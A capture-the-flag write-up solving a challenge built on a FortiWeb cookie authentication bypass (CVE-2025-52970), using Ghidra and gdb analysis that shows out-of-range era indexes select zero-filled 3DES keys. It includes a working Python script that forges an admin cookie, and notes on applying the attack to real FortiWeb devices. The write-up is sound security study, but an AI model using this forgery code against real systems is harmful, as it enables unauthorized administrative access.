# Fiftiweb: FortiWeb CVE-2025-52970 auth bypass    

```
Team: coldboots (https://ctftime.org/team/144114/)
Author: @ciphr
Date: 11.11.2025
```

# TL;DR
- era=2..9 use zero-initialized memory as 3DES key aka `key = b"\x00"*24`
- We craft our own cookie with `role=admin` to get flag from /protected 
- Challenge is based on a vulnerability in Fortiweb (CVE-2025-52970 auth bypass): https://nvd.nist.gov/vuln/detail/CVE-2025-52970

Well done and a round of applause for EPT and nordbo for creating a CTF challenge from a CVE, always welcome and related to the daily work for some of us. It also shows that alot of the stuff we do in CTF's can be and are related to real-world usage. Both in how we work (methods, tools etc) when solving challenges, but also how vulnerabilities "are made", and how we exploit them.

# mindmap
You can see my supershort summary in [mindmap_CVE-2025-52970_fortiweb_authbypass.png](mindmap_CVE-2025-52970_fortiweb_authbypass.png).

I did a walkthough of both this CVE and the CTF challenge at work. Im sorry if you dont read Norwegian, but you get the overall picture anyways.

# ghidra: preliminary analysis
Opened mod_fifti.so in Ghidra. It's nice that the challenge **author created a short and consie file with debug symbols, lucky us!**

I started by looking for `Era` `Payload` and `AuthHash`. I found one for a format string and one for sscanf.
```
001044e4	s_Era=%d&Payload=%s&AuthHash=%s_001044d2	ds "Era=%d&Payload=%s&AuthHash=%s"
0010404a	s_Era=%%1d&Payload=%%%d[^&]&AuthHa_00104030	ds "Era=%%1d&Payload=%%%d[^&]&AuthHash=%%%ds"
```

# cu_login_handler
Cookies are **created** in cu_login_handler on the format `user=%s&exp=%ld\nrole=%s`. Ghidra doesn't show it correctly atleast for me, but `key` and `iv` is loaded from `key=nCfg_debug_zone_ptr+0x58` and `iv=nCfg_debug_zone_ptr+0x48`. It adds **user**, **role** and **exp**iry with +3600.
```
tVar10 = time((time_t *)0x0);
pcVar17 = (char *)apr_psprintf(*param_1,"user=%s&exp=%ld\nrole=%s",local_590,tVar10 + 0xe10,ppcVar19[2]);
lVar14 = apr_psprintf(uVar8,"Era=%d&Payload=%s&AuthHash=%s",0,out,puVar12);
```

# cookieval_unwrap
Cookies are **validated** in cookieval_unwrap with the same offset as cu_login_handler, but the key also adds `Era=<eraidx> * 0x20`.
```
__snprintf_chk(input_string,0x80,1,0x80,"Era=%%1d&Payload=%%%d[^&]&AuthHash=%%%ds",0x1000,0x40);
iVar1 = __isoc99_sscanf(INPUT_STIRNG,input_string,&EraIdx,Payload,AuthHash);
key = (uchar *)(nCfg_debug_zone_ptr + 0x58 + (long)EraIdx * 0x20);
iv = (uchar *)(nCfg_debug_zone_ptr + 0x48);
```

The challenge only loads 2 keys in the 000-fiftiweb.conf.

> Which keys are used for `Era >= 2`? Let's go into a debugger.

# Preparations for debugging

I modified Dockerfile to `include pwndbg` and set `-X` to apache2 so we get a single thread, easier debug. Added `gdb` to apt-get install. 

```
RUN echo "set auto-load safe-path /" >> /root/.gdbinit
RUN curl -qsL 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb

CMD ["apache2ctl", "-D", "FOREGROUND", "-X"]
```

Modified `chall/000-fiftiweb.conf` so keys and IV is easier to find in gdb.
```
    fiftiKeyHexEra0 4141414141414141414141414141414141414141414141414141414141414141
    fiftiKeyHexEra1 4242424242424242424242424242424242424242424242424242424242424242
    fiftiIVHex 4343434343434343
```

Setup a supersmall `docker-compose.yml` and then `docker compose down ; docker compose up -d`
```
services:
  fitisweb:
    build: .
    cap_add:
      - SYS_PTRACE
    ports:
      - 5000:5000
```

Curl'ed my instance so `nCfg_debug_zone` is initialized with a user login: `curl http://localhost:5000/login -X POST -d "username=user&password=password" -v`
Now we also see the structure of the cookie:

```
< Set-Cookie: enterprise_grade_cookie=Era=0&Payload=WYPKYb0MSt5D/l7mOvUzLijM4nhODcavKl5uHYaLQnA/Nx73Tp17PkYCdiGOKhTK&AuthHash=cZ/Tj2r0Ilq23mXaDakAWwcy/SM=; Path=/; HttpOnly

{"success": true, "message": "Login successful"}
```

Exec into container and attach gdb to the single-threaded apache2: `docker exec -ti fiftiweb-fitisweb-1 sh -c "pwndbg -p \$(pidof apache2)"`

# pwndbg
We want debug symbols, and load mod_fifti.so. Using vmmap we find where in memory it is loaded, and add the file with *add-symbol-file <base offset>** so offsets/memory addresses will be correct. In this show-off I found `base offset = @0x70a2ab321000`
```
pwndbg> vmmap mod_fifti

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x70a2ab31b000     0x70a2ab31f000 rw-p     4000       0 [anon_70a2ab31b]
►   0x70a2ab31f000     0x70a2ab321000 r--p     2000       0 /usr/lib/apache2/modules/mod_fifti.so   <- read only (elf header)
►   0x70a2ab321000     0x70a2ab323000 r-xp     2000    2000 /usr/lib/apache2/modules/mod_fifti.so   <- x = executable code -- symbol addresses
►   0x70a2ab323000     0x70a2ab324000 r--p     1000    4000 /usr/lib/apache2/modules/mod_fifti.so   <- .rodata (readonly)
►   0x70a2ab324000     0x70a2ab325000 r--p     1000    5000 /usr/lib/apache2/modules/mod_fifti.so   <- .rodata (readonly)
►   0x70a2ab325000     0x70a2ab326000 rw-p     1000    6000 /usr/lib/apache2/modules/mod_fifti.so   <- .data/.bss (write, but runtime allocated memory)
    0x70a2ab326000     0x70a2ab34e000 rw-p    28000       0 [anon_70a2ab326]    

pwndbg> add-symbol-file /usr/lib/apache2/modules/mod_fifti.so 0x70a2ab321000
add symbol table from file "/usr/lib/apache2/modules/mod_fifti.so" at
        .text_addr = 0x70a2ab321000
Reading symbols from /usr/lib/apache2/modules/mod_fifti.so...
```

Now we can look at the disassembled `cookieval_unwrap`, after some examination we can just use `nearpc` to only see where *key|iv* is loaded. We recognize the code from Ghidra:
```
pwndbg> disassemble cookieval_unwrap 
...

pwndbg> nearpc cookieval_unwrap+586 5
 ► 0x70a2ab321c3a <cookieval_unwrap+586>    call   EVP_ENCODE_CTX_free@plt     <EVP_ENCODE_CTX_free@plt>
 
   0x70a2ab321c3f <cookieval_unwrap+591>    mov    rax, qword ptr [rip + 0x3452]     RAX, [nCfg_debug_zone_ptr]
   0x70a2ab321c46 <cookieval_unwrap+598>    test   rax, rax
   0x70a2ab321c49 <cookieval_unwrap+601>    je     cookieval_unwrap+985        <cookieval_unwrap+985>
 
   0x70a2ab321c4f <cookieval_unwrap+607>    movsxd rdx, dword ptr [rsp + 0x38]                      # rdx = Era
   0x70a2ab321c54 <cookieval_unwrap+612>    mov    dword ptr [rsp + 0x44], 0
   0x70a2ab321c5c <cookieval_unwrap+620>    lea    rbx, [rsp + 0x90]
   0x70a2ab321c64 <cookieval_unwrap+628>    shl    rdx, 5                                           # rdx << ~= rdx * 0x20
   0x70a2ab321c68 <cookieval_unwrap+632>    lea    r14, [rax + rdx + 0x58]                          # key = nCfg_debug_zone_ptr + 0x58 + era*0x20
   0x70a2ab321c6d <cookieval_unwrap+637>    add    rax, 0x48                                        # iv = nCfg_debug_zone_ptr + 0x48
   0x70a2ab321c71 <cookieval_unwrap+641>    mov    qword ptr [rsp + 0x18], rax
   0x70a2ab321c76 <cookieval_unwrap+646>    call   EVP_sha1@plt                <EVP_sha1@plt>   
```

Let's examine `nCfg_debug_zone_ptr`, and in particular where the keys are. It has `.accepted_content_types` and `.iv` and `.era_keys`.

```
pwndbg> print nCfg_debug_zone_ptr
$1 = (NcfgDebugZone *) 0x70a2ab43c488

pwndbg> ptype NcfgDebugZone
type = struct NcfgDebugZone {
    char accepted_content_types[3][24];
    uint8_t iv[16];
    uint8_t era_keys[512];
}

pwndbg> set $ptr = (void *)nCfg_debug_zone_ptr
pwndbg> x/192bx $ptr
0x70a2ab43c488: 0x74    0x65    0x78    0x74    0x2f    0x70    0x6c    0x61   <- accepted_content_types[0][24]
0x70a2ab43c490: 0x69    0x6e    0x00    0x00    0x00    0x00    0x00    0x00
0x70a2ab43c498: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x70a2ab43c4a0: 0x61    0x70    0x70    0x6c    0x69    0x63    0x61    0x74   <- accepted_content_types[1][24]
0x70a2ab43c4a8: 0x69    0x6f    0x6e    0x2f    0x6a    0x73    0x6f    0x6e
0x70a2ab43c4b0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x70a2ab43c4b8: 0x61    0x70    0x70    0x6c    0x69    0x63    0x61    0x74   <- accepted_content_types[2][24]
0x70a2ab43c4c0: 0x69    0x6f    0x6e    0x2f    0x70    0x72    0x6f    0x62
0x70a2ab43c4c8: 0x6c    0x65    0x6d    0x2b    0x6a    0x73    0x6f    0x6e
0x70a2ab43c4d0: 0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43   <- iv[16] (but 3DES iv is 8 bytes..)
0x70a2ab43c4d8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x70a2ab43c4e0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41   <- era_keys[0]  aka cookie "era=0&.."
0x70a2ab43c4e8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x70a2ab43c4f0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x70a2ab43c4f8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x70a2ab43c500: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42   <- era_keys[1]  aka cookie "era=1&.."
0x70a2ab43c508: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x70a2ab43c510: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x70a2ab43c518: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x70a2ab43c520: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00   <- era_keys[2]  aka cookie "era=2&.."
0x70a2ab43c528: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00  
0x70a2ab43c530: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00 
0x70a2ab43c538: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x70a2ab43c540: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

We see that `era=2 uses just null-byte keys`.

We also see that `accepted_content_types[2]` is followed by the `iv[16]` which means that when the program reads out the content-type for **era=2** we will also leak the IV. We will get the HTTP header set as `Content-Type: <accepted_content_types[2]><iv[0..7]>`. 8byte IV because it will stop reading once it hits the NULL byte at iv[8].

> **NOTE** A sidenote for readers with a keen crypto interest: 3DES splits the 24byte key into 3 keys used in a sequential Encrypt-Decrypt-Encrypt (hence the name 3DES). If these keys are equal 3DES will shortcut since a `Encrypt(K) -> Decrypt(k) = no change`. Using **era=2** we are in fact encrypting a `single DES with key=\x00 * 8`.

# craft cookie
Cookie is named `enterprise_grade_cookie` so we send (curl syntax) `-H Cookie: enterprise_grade_cookie=Era=..&Payload=..&AuthHash=..`

## IV ??
When I solved this, I did not realize I could leak IV. `So I rearranged my cookie to solve without IV`.

Cookie from remote is `user=user&exp=199917206\nrole=admin` but since **cu_protected_handler** only checks for `user=` and `role=` as a string, it doesn't matter __where in the cookie__ these are. Exp isn't used, so i just swapped them. **My payload** is `exp=199917206&user=user\nrole=admin`.

It was after I solved it that I realized that IV leaks into the content-type of era=2, where the challenge author has deliberately padded out the content-type of **accepted_content_types[2]** to 24bytes so it will keep reading the IV until it hits that NULL byte.


## solve.py
```python
from Crypto.Cipher import DES3
from Crypto.Hash import HMAC, SHA1
from Crypto.Util.Padding import pad, unpad
import base64 
import requests

def encrypt_cookie(era: int, plaintext: bytes, key32: bytes, iv8: bytes) -> str:
    key24 = DES3.adjust_key_parity(key32[:24])
    cipher = DES3.new(key24, DES3.MODE_CBC, iv8)
    ct = cipher.encrypt(pad(plaintext, 8))
    auth = HMAC.new(key32, ct, SHA1).digest()
    return f"Era={era}&Payload={base64.b64encode(ct).decode()}&AuthHash={base64.b64encode(auth).decode()}"

session = requests.Session()
url = "https://coldboots-720a9e2e-fifti.ept.gg"
def attack(cookie):
    global session        
    print(cookie) # Era=2&Payload=orIryTEIhI2LyH+hcDJxKXIu8IYR8fcyyOtLVSvUI70lx2Q3NP/7ow==&AuthHash=O4fKGbsAI5VGU9/wXyriXw6MGdg=
    session.cookies.set("enterprise_grade_cookie", cookie)
    response = session.get(url+"/protected")

    # iv leak, for those that need it! :D 
    content_type = response.headers.get("Content-Type")
    iv_leak = content_type[-8:]  # application/problem+json<IV[0:7]>
    print("iv_leak=", iv_leak)
    return response.json()["data"]

Era = 2 
key = b'\x00' * 24 
iv = b"\x00"*8 # doesn't matter what it is
pt = b"exp=199917206&user=user\nrole=admin"

resp = attack(encrypt_cookie(Era, pt, key, iv))
print("flag=", resp)

"""
❯ python3 solve.py
Era=2&Payload=orIryTEIhI2LyH+hcDJxKXIu8IYR8fcyyOtLVSvUI70lx2Q3NP/7ow==&AuthHash=O4fKGbsAI5VGU9/wXyriXw6MGdg=
iv_leak= AiSemYLf
flag= EPT{c00k13_4uth_m4st3r_2025}
"""
```

# The real deal: FortiWeb
I tested a vulnerable FortiWeb instance and launched a similar attack. I had to modify my code abose, but I will not share the final results here.

This is how the vulnerable FortiWeb was patched, you can't use **Era >= 2** any more:
```
<         if (-1 < Era) {           # old
---
>         if (Era < 2) {            # new
```

Observations for the CVE attack:
- You need an active session, because the cookie name is `<constant>_<magic>` and you need that magic (its a big number), while in the CTF is is hardcoded to *enterprise_grade_cookie*.
- In Fortiweb; IV is hardkoded in the binary so you dont need to leak it.
- You need to guess something in the cookie to make it work, but the searchspace is extremely small and bruteforce takes seconds.


